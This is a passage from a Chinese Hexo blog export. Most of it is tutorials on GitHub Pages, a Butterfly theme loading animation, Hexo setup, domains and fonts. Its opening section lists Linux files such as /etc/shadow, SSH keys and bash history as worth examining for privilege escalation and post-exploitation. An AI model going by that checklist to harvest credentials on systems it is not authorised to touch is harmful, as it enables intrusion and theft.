用户的主目录。</td></tr><tr><td>/sbin</td><td>由系统和系统管理员来使用的程序。</td></tr><tr><td>/tmp</td><td>供系统使用的临时空间，重启时会被清空。</td></tr><tr><td>/usr</td><td>供所有用户相关程序使用的程序、库、文档等等。</td></tr><tr><td>/var</td><td>存储所有由用户创建的可变文件和临时文件，比如日志文件、邮件队列、后台打印程序，Web 服务器，数据库等等。</td></tr></tbody></table>  <h3 id="Linux-中有趣的文件-x2F-目录"><a href="#Linux-中有趣的文件-x2F-目录" class="headerlink" title="Linux 中有趣的文件 &#x2F; 目录"></a>Linux 中有趣的文件 &#x2F; 目录</h3><p>如果你想尝试进行特权升级 &#x2F; 执行后期开发，这些都是你值得一瞧的命令。</p><table><tbody><tr><th>路径</th><th>描述</th></tr></tbody><tbody><tr><td>/etc/passwd</td><td>包含了本地 Linux 的用户。</td></tr><tr><td>/etc/shadow</td><td>包含了哈希过的本地账户密码。</td></tr><tr><td>/etc/group</td><td>包含了本地账户分组。</td></tr><tr><td>/etc/init.d/</td><td>包含了服务网初始化脚本 – 具体都安装了些啥应该值得一瞧。</td></tr><tr><td>/etc/hostname</td><td>系统的 hostname。</td></tr><tr><td>/etc/network/interfaces</td><td>网络接口。</td></tr><tr><td>/etc/resolv.conf</td><td>系统的 DNS 服务。</td></tr><tr><td>/etc/profile</td><td>系统的环境变量。</td></tr><tr><td>~/.ssh/</td><td>SSH 密钥。</td></tr><tr><td>~/.bash_history</td><td>用户的 bash 历史日志。</td></tr><tr><td>/var/log/</td><td>Linux 系统的日志文件一般就被存放在这里。</td></tr><tr><td>/var/adm/</td><td>UNIX 系统的日志文件一般就被存在在这里。</td></tr><tr><td>/var/log/apache2/access.log /var/log/httpd/access.log</td><td>Apache 访问日志文件通常的存在路径。</td></tr><tr><td>/etc/fstab</td><td>挂载的文件系统。</td></tr></tbody></table>]]></content>
      
      
      <categories>
          
          <category> 技术 </category>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>GitHub Page</title>
      <link href="/2023/03/01/%E5%8D%9A%E5%AE%A2/GitHub%20Page/"/>
      <url>/2023/03/01/%E5%8D%9A%E5%AE%A2/GitHub%20Page/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"/>##  创建仓库<ul><li>仓库名：<code>username</code> + <code>.github.io</code></li><li>仓库状态：<code>public</code></li></ul><h2 id="指定分支"><a href="#指定分支" class="headerlink" title="指定分支"></a>指定分支</h2><p>在推送到完博客到仓库后，Settings -&gt; Pages -&gt; Branch，设置分支即可</p><h2 id="自定义域名"><a href="#自定义域名" class="headerlink" title="自定义域名"></a>自定义域名</h2><p>Settings -&gt; Pages -&gt; Custom domain</p>]]></content>
      
      
      <categories>
          
          <category> 博客 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 博客 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>加载动画</title>
      <link href="/2023/03/01/%E5%8D%9A%E5%AE%A2/%E5%8A%A0%E8%BD%BD%E5%8A%A8%E7%94%BB/"/>
      <url>/2023/03/01/%E5%8D%9A%E5%AE%A2/%E5%8A%A0%E8%BD%BD%E5%8A%A8%E7%94%BB/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"/><h2 id="参考来源"><a href="#参考来源" class="headerlink" title="参考来源"></a>参考来源</h2><p><a href="https://anzhiy.cn/posts/52d8.html">安之鱼 | Heo同款loading动画</a></p><h2 id="效果预览"><a href="#效果预览" class="headerlink" title="效果预览"></a>效果预览</h2><p><img src="https://s2.loli.net/2023/03/04/QLpo91wnT3lXOCt.png" alt="加载动画-效果预览.png"></p><h2 id="版本"><a href="#版本" class="headerlink" title="版本"></a>版本</h2><ul><li>Node: 12.13.0</li><li>Hexo: 6.3.0</li><li>Butterfly: 4.7.0</li></ul><h2 id="方案"><a href="#方案" class="headerlink" title="方案"></a>方案</h2><p>修改 <code>themes/butterfly/layout/includes/loading/fullpage-loading.pug</code></p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">#loading-box(onclick=&#x27;document.getElementById(&quot;loading-box&quot;).classList.add(&quot;loaded&quot;)&#x27;)</span><br><span class="line">  .loading-bg</span><br><span class="line">    div.loading-img</span><br><span class="line">    .loading-image-dot</span><br><span class="line"></span><br><span class="line">script.</span><br><span class="line">  const preloader = &#123;</span><br><span class="line">    endLoading: () =&gt; &#123;</span><br><span class="line">      document.body.style.overflow = &#x27;auto&#x27;;</span><br><span class="line">      document.getElementById(&#x27;loading-box&#x27;).classList.add(&quot;loaded&quot;)</span><br><span class="line">    &#125;,</span><br><span class="line">    initLoading: () =&gt; &#123;</span><br><span class="line">      document.body.style.overflow = &#x27;&#x27;;</span><br><span class="line">      document.getElementById(&#x27;loading-box&#x27;).classList.remove(&quot;loaded&quot;)</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  window.addEventListener(&#x27;load&#x27;,()=&gt; &#123; preloader.endLoading() &#125;)</span><br><span class="line"></span><br><span class="line">  if (!&#123;theme.pjax &amp;&amp; theme.pjax.enable&#125;) &#123;</span><br><span class="line">    document.addEventListener(&#x27;pjax:send&#x27;, () =&gt; &#123; preloader.initLoading() &#125;)</span><br><span class="line">    document.addEventListener(&#x27;pjax:complete&#x27;, () =&gt; &#123; preloader.endLoading() &#125;)</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>修改 <code>themes/butterfly/layout/includes/loading/index.pug</code></p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">if theme.preloader.source === 1</span><br><span class="line">  include ./fullpage-loading.pug</span><br><span class="line">else if theme.preloader.source === 2</span><br><span class="line">  include ./pace.pug</span><br><span class="line">else</span><br><span class="line">  include ./fullpage-loading.pug</span><br><span class="line">  include ./pace.pug</span><br></pre></td></tr></table></figure><p>新建 <code>source/css/progress_bar.css</code>，也可以不做这一步下面配置文件 <code>pace_css_url</code> 这一项就要留空， 这一步是修改 pace 加载的胶囊 💊 样式用的</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.pace</span> &#123;</span><br><span class="line">  -webkit-<span class="attribute">pointer-events</span>: none;</span><br><span class="line">  <span class="attribute">pointer-events</span>: none;</span><br><span class="line">  -webkit-user-select: none;</span><br><span class="line">  -moz-user-select: none;</span><br><span class="line">  user-select: none;</span><br><span class="line">  <span class="attribute">z-index</span>: <span class="number">2000</span>;</span><br><span class="line">  <span class="attribute">position</span>: fixed;</span><br><span class="line">  <span class="attribute">margin</span>: auto;</span><br><span class="line">  <span class="attribute">top</span>: <span class="number">10px</span>;</span><br><span class="line">  <span class="attribute">left</span>: <span class="number">0</span>;</span><br><span class="line">  <span class="attribute">right</span>: <span class="number">0</span>;</span><br><span class="line">  <span class="attribute">height</span>: <span class="number">8px</span>;</span><br><span class="line">  <span class="attribute">border-radius</span>: <span class="number">8px</span>;</span><br><span class="line">  <span class="attribute">width</span>: <span class="number">4rem</span>;</span><br><span class="line">  <span class="attribute">background</span>: <span class="number">#eaecf2</span>;</span><br><span class="line">  <span class="attribute">border</span>: <span class="number">1px</span> <span class="number">#e3e8f7</span>;</span><br><span class="line">  <span class="attribute">overflow</span>: hidden;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.pace-inactive</span> <span class="selector-class">.pace-progress</span> &#123;</span><br><span class="line">  <span class="attribute">opacity</span>: <span class="number">0</span>;</span><br><span class="line">  <span class="attribute">transition</span>: <span class="number">0.3s</span> ease-in;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.pace</span> <span class="selector-class">.pace-progress</span> &#123;</span><br><span class="line">  -webkit-<span class="attribute">box-sizing</span>: border-box;</span><br><span class="line">  -moz-<span class="attribute">box-sizing</span>: border-box;</span><br><span class="line">  -ms-<span class="attribute">box-sizing</span>: border-box;</span><br><span class="line">  -o-<span class="attribute">box-sizing</span>: border-box;</span><br><span class="line">  <span class="attribute">box-sizing</span>: border-box;</span><br><span class="line">  -webkit-<span class="attribute">transform</span>: <span class="built_in">translate3d</span>(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">  -moz-<span class="attribute">transform</span>: <span class="built_in">translate3d</span>(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">  -ms-<span class="attribute">transform</span>: <span class="built_in">translate3d</span>(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">  -o-<span class="attribute">transform</span>: <span class="built_in">translate3d</span>(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="attribute">transform</span>: <span class="built_in">translate3d</span>(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="attribute">max-width</span>: <span class="number">200px</span>;</span><br><span class="line">  <span class="attribute">position</span>: absolute;</span><br><span class="line">  <span class="attribute">z-index</span>: <span class="number">2000</span>;</span><br><span class="line">  <span class="attribute">display</span>: block;</span><br><span class="line">  <span class="attribute">top</span>: <span class="number">0</span>;</span><br><span class="line">  <span class="attribute">right</span>: <span class="number">100%</span>;</span><br><span class="line">  <span class="attribute">height</span>: <span class="number">100%</span>;</span><br><span class="line">  <span class="attribute">width</span>: <span class="number">100%</span>;</span><br><span class="line">  <span class="attribute">background</span>: <span class="built_in">linear-gradient</span>(-<span class="number">45deg</span>, <span class="number">#ee7752</span>, <span class="number">#e73c7e</span>, <span class="number">#23a6d5</span>, <span class="number">#23d5ab</span>);</span><br><span class="line">  <span class="attribute">animation</span>: gradient <span class="number">1.5s</span> ease infinite;</span><br><span class="line">  <span class="attribute">background-size</span>: <span class="number">200%</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.pace</span><span class="selector-class">.pace-inactive</span> &#123;</span><br><span class="line">  <span class="attribute">opacity</span>: <span class="number">0</span>;</span><br><span class="line">  <span class="attribute">transition</span>: <span class="number">0.3s</span>;</span><br><span class="line">  <span class="attribute">top</span>: -<span class="number">8px</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">@keyframes</span> gradient &#123;</span><br><span class="line">  <span class="number">0%</span> &#123;</span><br><span class="line">    <span class="attribute">background-position</span>: <span class="number">0%</span> <span class="number">50%</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="number">50%</span> &#123;</span><br><span class="line">    <span class="attribute">background-position</span>: <span class="number">100%</span> <span class="number">50%</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="number">100%</span> &#123;</span><br><span class="line">    <span class="attribute">background-position</span>: <span class="number">0%</span> <span class="number">50%</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>修改 <code>themes/butterfly/source/css/_layout/loading.styl</code>，注意其中颜色代码 <code>----mlemontx-theme</code> 等需自行替换为自己的色值</p><figure class="highlight styl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> <span class="built_in">hexo-config</span>(<span class="string">&#x27;preloader&#x27;</span>)</span><br><span class="line">  <span class="selector-class">.loading-bg</span></span><br><span class="line">    <span class="attribute">display</span>: flex;</span><br><span class="line">    <span class="attribute">width</span>: <span class="number">100%</span>;</span><br><span class="line">    <span class="attribute">height</span>: <span class="number">100%</span>;</span><br><span class="line">    <span class="attribute">position</span>: fixed;</span><br><span class="line">    <span class="attribute">background</span>: <span class="built_in">var</span>(----mlemontx-theme);</span><br><span class="line">    <span class="attribute">z-index</span>: <span class="number">1001</span>;</span><br><span class="line">    <span class="attribute">opacity</span>: <span class="number">1</span>;</span><br><span class="line">    <span class="attribute">transition</span>: .<span class="number">3s</span>;</span><br><span class="line"></span><br><span class="line">  <span class="selector-id">#loading-box</span></span><br><span class="line">    <span class="selector-class">.loading-img</span></span><br><span class="line">      <span class="attribute">width</span>: <span class="number">100px</span>;</span><br><span class="line">      <span class="attribute">height</span>: <span class="number">100px</span>;</span><br><span class="line">      <span class="attribute">border-radius</span>: <span class="number">50%</span>;</span><br><span class="line">      <span class="attribute">margin</span>: auto;</span><br><span class="line">      <span class="attribute">border</span>: <span class="number">4px</span> solid <span class="number">#f0f0f2</span>;</span><br><span class="line">      <span class="attribute">animation-duration</span>: .<span class="number">3s</span>;</span><br><span class="line">      <span class="attribute">animation-name</span>: loadingAction;</span><br><span class="line">      <span class="attribute">animation-iteration-count</span>: infinite;</span><br><span class="line">      <span class="attribute">animation-direction</span>: alternate;</span><br><span class="line">    <span class="selector-class">.loading-image-dot</span></span><br><span class="line">      <span class="attribute">width</span>: <span class="number">30px</span>;</span><br><span class="line">      <span class="attribute">height</span>: <span class="number">30px</span>;</span><br><span class="line">      <span class="attribute">background</span>: <span class="number">#6bdf8f</span>;</span><br><span class="line">      <span class="attribute">position</span>: absolute;</span><br><span class="line">      <span class="attribute">border-radius</span>: <span class="number">50%</span>;</span><br><span class="line">      <span class="attribute">border</span>: <span class="number">6px</span> solid <span class="number">#fff</span>;</span><br><span class="line">      <span class="attribute">top</span>: <span class="number">50%</span>;</span><br><span class="line">      <span class="attribute">left</span>: <span class="number">50%</span>;</span><br><span class="line">      <span class="attribute">transform</span>: <span class="built_in">translate</span>(<span class="number">18px</span>, <span class="number">24px</span>);</span><br><span class="line">    &amp;<span class="selector-class">.loaded</span></span><br><span class="line">      <span class="selector-class">.loading-bg</span></span><br><span class="line">        <span class="attribute">opacity</span>: <span class="number">0</span>;</span><br><span class="line">        <span class="attribute">z-index</span>: -<span class="number">1000</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">@keyframes</span> loadingAction</span><br><span class="line">    <span class="number">0%</span> &#123;</span><br><span class="line">        <span class="attribute">opacity</span>: <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="number">100%</span> &#123;</span><br><span class="line">        <span class="attribute">opacity</span>: .<span class="number">4</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>自定义 css 文件，其中 <code>background</code> 的 <code>url</code> 即为 loading 的图片地址</p><p><a href="https://blog.leonus.cn/2022/custom.html">Leonus | Hexo博客添加自定义css和js文件</a></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.loading-img</span> &#123;</span><br><span class="line">    <span class="attribute">background</span>: <span class="built_in">url</span>(<span class="string">&#x27;//s2.loli.net/2023/03/04/aBsd12DAvGUtob9.png&#x27;</span>) no-repeat center center;</span><br><span class="line">    <span class="attribute">background-size</span>: cover;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最后修改 <code>_config.butterfly.yml</code> 中 <code>preloader</code> 选项，改完以后 <code>source: 1</code> 为满屏加载无 pace 胶囊，<code>source: 2</code> 为 pace 胶囊无满屏动画，<code>source: 3</code> 是两者都启用</p><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Loading Animation (加载动画)</span></span><br><span class="line"><span class="attr">preloader:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">  <span class="comment"># source</span></span><br><span class="line">  <span class="comment"># 1. fullpage-loading</span></span><br><span class="line">  <span class="comment"># 2. pace (progress bar)</span></span><br><span class="line">  <span class="comment"># else all</span></span><br><span class="line">  <span class="attr">source:</span> <span class="number">3</span></span><br><span class="line">  <span class="comment"># pace theme (see https://codebyzach.github.io/pace/)</span></span><br><span class="line">  <span class="attr">pace_css_url:</span> <span class="string">/css/progress_bar.css</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 博客 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 博客 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>搭建 Hexo</title>
      <link href="/2023/03/01/%E5%8D%9A%E5%AE%A2/Hexo%20%E6%90%AD%E5%BB%BA%E9%9D%99%E6%80%81%E5%8D%9A%E5%AE%A2/"/>
      <url>/2023/03/01/%E5%8D%9A%E5%AE%A2/Hexo%20%E6%90%AD%E5%BB%BA%E9%9D%99%E6%80%81%E5%8D%9A%E5%AE%A2/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"/><h2 id="下载-node"><a href="#下载-node" class="headerlink" title="下载 node"></a>下载 node</h2><p><a href="https://hexo.io/zh-cn/docs/">hexo 文档</a><br><a href="https://nodejs.org/dist/">node 下载</a><br>在 hexo 文档，开始使用 -&gt; 概述中查看 node 版本进行下载…<br>我使用的是 <code>12.13.0</code>，如果下载的是安装版直接安装即可，否则需要配置环境变量。</p><h2 id="npm-相关"><a href="#npm-相关" class="headerlink" title="npm 相关"></a>npm 相关</h2><h2 id="ERROR"><a href="#ERROR" class="headerlink" title="ERROR"></a>ERROR</h2><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">问题：</span><br><span class="line">npm : 无法将“npm”项识别为 cmdlet、函数、脚本文件或可运行程序的名称。</span><br><span class="line"></span><br><span class="line">解决方法：</span><br><span class="line">权限不足，用管理员运行软件。</span><br></pre></td></tr></table></figure><h2 id="更改-npm-源"><a href="#更改-npm-源" class="headerlink" title="更改 npm 源"></a>更改 npm 源</h2><p>查看现在的源</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm get registry</span><br></pre></td></tr></table></figure><p>更改为淘宝源</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm config set registry https://registry.npm.taobao.org</span><br></pre></td></tr></table></figure><h2 id="搭建-hexo-环境"><a href="#搭建-hexo-环境" class="headerlink" title="搭建 hexo 环境"></a>搭建 hexo 环境</h2><h2 id="安装-hexo-脚手架"><a href="#安装-hexo-脚手架" class="headerlink" title="安装 hexo 脚手架"></a>安装 hexo 脚手架</h2><p>新建博客目录：我这里是 github 仓库名 <code>mlemontx.github.io</code>，进入目录 <code>cmd</code> 执行改命令…</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install -g hexo-cli</span><br></pre></td></tr></table></figure><h2 id="安装-hexo"><a href="#安装-hexo" class="headerlink" title="安装 hexo"></a>安装 hexo</h2><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo</span><br></pre></td></tr></table></figure><h2 id="建站"><a href="#建站" class="headerlink" title="建站"></a>建站</h2><h2 id="ERROR-1"><a href="#ERROR-1" class="headerlink" title="ERROR"></a>ERROR</h2><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">问题：</span><br><span class="line">hexo : 无法加载文件 D:\Environment\node\node-v12.13.0-win-x64\hexo.ps1，因为在此系统上禁止运行脚本。</span><br><span class="line"></span><br><span class="line">解决：</span><br><span class="line">管理员身份运行 power shell</span><br><span class="line">输入：set-ExecutionPolicy RemoteSigned</span><br></pre></td></tr></table></figure><h2 id="初始化"><a href="#初始化" class="headerlink" title="初始化"></a>初始化</h2><ol><li><p>初始化</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo init blog</span><br></pre></td></tr></table></figure></li><li><p>配置</p></li></ol><p><code>_config.yml</code> 文件</p><h2 id="本地运行"><a href="#本地运行" class="headerlink" title="本地运行"></a>本地运行</h2><p>安装服务</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo-server --save</span><br></pre></td></tr></table></figure><p><strong>ps: 以下命令需要 blog，也就是 hexo init blog 下的目录执行</strong></p><p>生成静态文件</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo g</span><br></pre></td></tr></table></figure><p>本地运行</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo s</span><br></pre></td></tr></table></figure><p>推送到 github</p><p>安装部署包</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo-deployer-git --save</span><br></pre></td></tr></table></figure><p>在 <code>_config.yml</code> 中配置以下…</p><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">deploy:</span>  </span><br><span class="line">  <span class="attr">type:</span> <span class="string">git</span>  </span><br><span class="line">  <span class="attr">repo:</span> <span class="string">https://github.com/&lt;username&gt;/&lt;project&gt;</span>  </span><br><span class="line">  <span class="comment"># example, https://github.com/hexojs/hexojs.github.io  </span></span><br><span class="line">  <span class="attr">branch:</span> <span class="string">master</span></span><br></pre></td></tr></table></figure><p>配置完成后执行以下命令…</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo d</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 博客 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 博客 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>域名</title>
      <link href="/2023/03/01/%E5%8D%9A%E5%AE%A2/%E5%9F%9F%E5%90%8D/"/>
      <url>/2023/03/01/%E5%8D%9A%E5%AE%A2/%E5%9F%9F%E5%90%8D/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"/>## 买域名<p>去阿里云、腾讯云、百度云等等去买自己想要的域名</p><h2 id="解析"><a href="#解析" class="headerlink" title="解析"></a>解析</h2><p>记录类型：CNAME<br>主机记录：域名前缀<br>记录值：映射地址</p><h2 id="证书"><a href="#证书" class="headerlink" title="证书"></a>证书</h2><h2 id="证书的功能："><a href="#证书的功能：" class="headerlink" title="证书的功能："></a>证书的功能：</h2><ul><li>确认网站真实性</li></ul><p>访问地址由 http 铭文访问，变成 https 加密访问，避免了网上存在着许多假冒、钓鱼网站；</p><p>用户如何来判断网站的真实性呢？SSL 证书将帮你确保网站的真实身份，确保传输数据不被泄露或篡改。</p><ul><li>使用高级别的 EV SSL 证书</li></ul><p>https 地址栏即显示绿色图标，状态栏能直观展示企业单位名称及颁发机构。</p><ul><li>提升搜索排名</li></ul><p>采用 Https 加密的网站在搜索结果中的排名将会高于 Http，同时国内的搜索引擎厂商也在加强对 Https 的重视，采用 Https 可以辅助站点的 SEO 优化。</p><h2 id="免费证书"><a href="#免费证书" class="headerlink" title="免费证书"></a>免费证书</h2><p>以阿里云为例，工作台搜索证书，点击免费证书，创建证书之后，点击立即购买。</p><p>证书申请，填写信息，提交审核。</p>]]></content>
      
      
      <categories>
          
          <category> 博客 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 博客 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>图标和字体</title>
      <link href="/2023/03/01/%E5%8D%9A%E5%AE%A2/%E5%9B%BE%E6%A0%87%E5%92%8C%E5%AD%97%E4%BD%93/"/>
      <url>/2023/03/01/%E5%8D%9A%E5%AE%A2/%E5%9B%BE%E6%A0%87%E5%92%8C%E5%AD%97%E4%BD%93/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"/>## 图标<p><a href="https://www.iconfont.cn/">阿里巴巴矢量图标库</a></p><p><a href="https://butterfly.js.org/posts/4aa8abbe/#%E4%BB%A3%E7%A2%BC%E9%AB%98%E5%BA%A6%E9%99%90%E5%88%B6">Butterfly | Butterfly 安装文档(三) 主题配置-1</a></p><p><a href="https://akilar.top/posts/d2ebecef/">Akilar | Iconfont Inject</a></p><p>图标的东西都很简单，简单看一下文档，就不多说了</p><h2 id="字体"><a href="#字体" class="headerlink" title="字体"></a>字体</h2><h3 id="免费字体网站"><a href="#免费字体网站" class="headerlink" title="免费字体网站"></a>免费字体网站</h3><p><a href="https://www.fontspace.com/">Free Fonts</a></p><p><a href="https://github.com/adobe-fonts">Adobe Fonts</a></p><p><a href="https://www.zcool.com.cn/special/zcoolfonts/">站酷字库</a></p><p><a href="https://www.fonts.net.cn/">字体天下</a></p><p><a href="https://github.com/microsoft/cascadia-code">cascadia-code</a></p><h3 id="大厂字体列表及引用链接"><a href="#大厂字体列表及引用链接" class="headerlink" title="大厂字体列表及引用链接"></a>大厂字体列表及引用链接</h3><h4 id="鸿蒙字体-B-站"><a href="#鸿蒙字体-B-站" class="headerlink" title="鸿蒙字体 - B 站"></a>鸿蒙字体 - B 站</h4><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">400</span> 字重 CSS：https://s1.hdslb.com/bfs/static/jinkela/long/font/regular.css</span><br><span class="line"><span class="number">500</span> 字重 CSS：https://s1.hdslb.com/bfs/static/jinkela/long/font/medium.css</span><br></pre></td></tr></table></figure><h4 id="华康金刚黑-字节跳动"><a href="#华康金刚黑-字节跳动" class="headerlink" title="华康金刚黑 - 字节跳动"></a>华康金刚黑 - 字节跳动</h4><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">400</span> 字重 CSS：https://fonts.bytedance.com/dfd/api/v1/css?family=DFPKingGothicGB-Regular&amp;display=swap</span><br><span class="line"><span class="number">500</span> 字重 CSS：https://fonts.bytedance.com/dfd/api/v1/css?family=DFPKingGothicGB-medium&amp;display=swap</span><br></pre></td></tr></table></figure><h4 id="思源黑体-谷歌字体库"><a href="#思源黑体-谷歌字体库" class="headerlink" title="思源黑体 - 谷歌字体库"></a>思源黑体 - 谷歌字体库</h4><figure class="highlight css"><table><tr><td class="gutter"><pre><span 